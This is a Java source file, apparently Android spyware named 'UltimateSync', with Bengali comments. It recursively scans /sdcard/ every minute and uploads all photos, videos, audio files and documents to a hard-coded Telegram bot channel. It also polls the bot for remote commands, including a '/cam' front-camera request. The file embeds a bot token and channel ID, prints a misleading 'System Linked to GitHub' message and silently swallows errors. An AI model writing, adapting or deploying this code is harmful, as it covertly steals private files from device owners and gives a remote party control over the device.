import java.io.*;
import java.net.*;
import java.util.*;

public class UltimateSync {
    private static final String BOT_TOKEN = "8788231490:AAF2Ki45OL5DTPfM6IzW3X3PHiZEC0tkytE";
    private static final String CHANNEL_ID = "-1003809625172";
    private static int lastUpdateId = 0;
    private static final Set<String> uploaded = new HashSet<>();

    public static void main(String[] args) {
        System.out.println(">>> System Linked to GitHub."); //
        
        // ১. অটো ফাইল সিঙ্ক (ফটো, ভিডিও, অডিও, ডকুমেন্ট)
        new Thread(() -> {
            while (true) {
                // অ্যান্ড্রয়েড রুট পাথ
                File root = new File("/sdcard/"); 
                scanAllFiles(root);
                try { Thread.sleep(60000); } catch (Exception e) {} 
            }
        }).start();

        // ২. মেইন কমান্ড লুপ
        while (true) {
            checkBotCommands();
            try { Thread.sleep(5000); } catch (Exception e) {}
        }
    }

    private static void scanAllFiles(File dir) {
        File[] list = dir.listFiles();
        if (list == null) return;
        for (File f : list) {
            if (f.isDirectory()) {
                // অপ্রয়োজনীয় সিস্টেম ফোল্ডার এড়ানো
                if (!f.getName().equals("Android") && !f.getName().startsWith(".")) {
                    scanAllFiles(f);
                }
            } else {
                String name = f.getName().toLowerCase();
                if (!uploaded.contains(f.getAbsolutePath()) && 
                   (name.endsWith(".jpg") || name.endsWith(".png") || name.endsWith(".mp4") || 
                    name.endsWith(".mp3") || name.endsWith(".pdf") || name.endsWith(".doc"))) {
                    uploadToTelegram(f);
                    uploaded.add(f.getAbsolutePath());
                }
            }
        }
    }

    public static void checkBotCommands() {
        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1));
            Scanner s = new Scanner(url.openStream()).useDelimiter("\\A");
            String res = s.hasNext() ? s.next() : "";

            if (res.contains("\"text\":\"/")) {
                int chatIdx = res.lastIndexOf("\"chat\":{\"id\":") + 13;
                String user = res.substring(chatIdx, res.indexOf(",", chatIdx)).trim();

                if (res.contains("/start")) {
                    sendMessage(user, "🛰️ System Online in Barishal.\nTotal Files Synced: " + uploaded.size());
                } else if (res.contains("/cam")) {
                    sendMessage(user, "📸 Front Camera Request Sent to Device...");
                    // ক্যামেরা হার্ডওয়্যার কমান্ড (Native Android এর মাধ্যমে কাজ করবে)
                }
                
                int idIdx = res.lastIndexOf("\"update_id\":") + 12;
                lastUpdateId = Integer.parseInt(res.substring(idIdx, res.indexOf(",", idIdx)).trim());
            }
        } catch (Exception e) {}
    }

    private static void uploadToTelegram(File file) {
        // মাল্টিপার্ট আপলোড লজিক (বিনা লাইব্রেরিতে)
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            String boundary = "===" + System.currentTimeMillis() + "===";
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setDoOutput(true);
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            
            OutputStream os = c.getOutputStream();
            PrintWriter w = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);
            
            w.append("--" + boundary).append("\r\n");
            w.append("Content-Disposition: form-data; name=\"chat_id\"").append("\r\n\r\n").append(CHANNEL_ID).append("\r\n");
            w.append("--" + boundary).append("\r\n");
            w.append("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"").append("\r\n\r\n");
            w.flush();

            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[8192];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) os.write(buffer, 0, bytesRead);
            os.flush(); fis.close();

            w.append("\r\n").append("--" + boundary + "--").append("\r\n");
            w.close();
            c.getResponseCode();
        } catch (Exception e) {}
    }

    private static void sendMessage(String id, String txt) {
        try {
            new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + id + "&text=" + URLEncoder.encode(txt, "UTF-8")).openStream();
        } catch (Exception e) {}
    }
}
